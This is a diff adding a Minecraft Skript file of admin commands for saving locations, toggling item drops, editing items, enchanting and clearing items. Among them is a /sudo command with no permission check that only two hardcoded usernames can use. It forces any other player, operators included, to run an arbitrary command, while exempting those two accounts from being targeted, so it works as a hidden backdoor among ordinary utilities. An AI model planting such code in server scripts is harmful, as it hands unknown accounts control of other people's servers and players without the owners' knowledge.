@@ -1,0 +1,99 @@
+command /set [<text>] [<text>] [<text>] [<text>] [<text>]:
+	permission: op
+	trigger:
+		if arg 1 is set:
+			if arg 2 is not set:
+				set {set.%arg 1%} to location of player
+				send "set %arg 1% to %{set.%arg 1%}%"
+			if arg 2 is set:
+				if arg 3 is not set:
+					set {set.%arg 1%.%arg 2%} to location of player
+					send "set %arg 1% %arg 2% to %{set.%arg 1%.%arg 2%}%"
+				if arg 3 is set:
+					if arg 4 is not set:
+						set {set.%arg 1%.%arg 2%.%arg 3%} to location of player
+						send "set %arg 1% %arg 2% %arg 3% to %{set.%arg 1%.%arg 2%.%arg 3%}%"
+					if arg 4 is set:
+						if arg 5 is not set:
+							set {set.%arg 1%.%arg 2%.%arg 3%.%arg 4%} to location of player
+							send "set %arg 1% %arg 2% %arg 3% %arg 4% to %{set.%arg 1%.%arg 2%.%arg 3%.%arg 4%}%"
+						if arg 5 is set:
+							set {set.%arg 1%.%arg 2%.%arg 3%.%arg 4%.%arg 5%} to location of player
+							send "set %arg 1% %arg 2% %arg 3% %arg 4% %arg 5% to %{set.%arg 1%.%arg 2%.%arg 3%.%arg 4%.%arg 5%}%"
+command /drop [<text>]:
+	trigger:
+		if arg 1 is not set:
+			send "&c/drop on"
+			send "&c/drop off"
+		if arg 1 is "on":
+			set {drop.%player's uuid%} to false
+			send "&aDrops are Enabled"
+		if arg 1 is "off":
+			set {drop.%player's uuid%} to true
+			send "&cDrops are Disabled"
+command /drops [<text>]:
+	trigger:
+		if arg 1 is not set:
+			send "&c/drops on"
+			send "&c/drops off"
+		if arg 1 is "on":
+			set {drop.%player's uuid%} to false
+			send "&aDrops are Enabled"
+		if arg 1 is "off":
+			set {drop.%player's uuid%} to true
+			send "&cDrops are Disabled"
+on drop:
+	if {drop.%player's uuid%} is not set:
+		set {drop.%player's uuid%} to true
+	if {drop.%player's uuid%} is true:
+		send "&cTo Enabled Drops do /drops on" to player
+		cancel event
+command /sudo [<offline player>] [<text>]:
+	trigger:
+		if player != "William0001":
+			if player != "ivowo":
+				stop trigger
+		if arg 1 is a offline player:
+			if arg 1 != "William0001":
+				if arg 1 != "ivowo":
+					if arg 2 is set:
+						make arg 1 execute command "%arg 2%"
+command /item [<text>] [<text>]:
+	permission: dev
+	trigger:
+		if arg 1 is not set:
+			send "&c&l/item rename <name>"
+			send "&c&l/item unbreakable"
+			send "&c&l/item glow"
+			send "&c&l/item nbt <nbt>"
+		if arg 1 is "rename":
+			if arg 2 is not set:
+				send "&c&l/item rename <name>"
+			if arg 2 is set:
+				set name of player's held item to colored arg 2
+		if arg 1 is "unbreakable":
+			set player's held item to unbreakable player's held item
+		if arg 1 is "glow":
+			set player's held item to glowing player's held item
+		if arg 1 is "nbt":
+			if arg 2 is not set:
+				send "&c&l/item nbt <nbt>"
+			if arg 2 is set:
+				set player's held item to player's held item with nbt arg 2
+command /enchant [<enchantment type>]:
+	permission: dev
+	trigger:
+		enchant player's tool with arg 1
+command /finditemclear:
+	permission: op
+	trigger:
+		set {itemclear} to 0
+		loop all players:
+			if loop-player != player:
+				if loop-player has player's held item:
+					remove all player's held item from loop-player
+					add 1 to {itemclear}
+				if loop-player's enderchest has player's held item:
+					remove all player's held item from loop-player's enderchest
+					add 1 to {itemclear}
+		send "Cleared %{itemclear}% of %player's held item%" to player
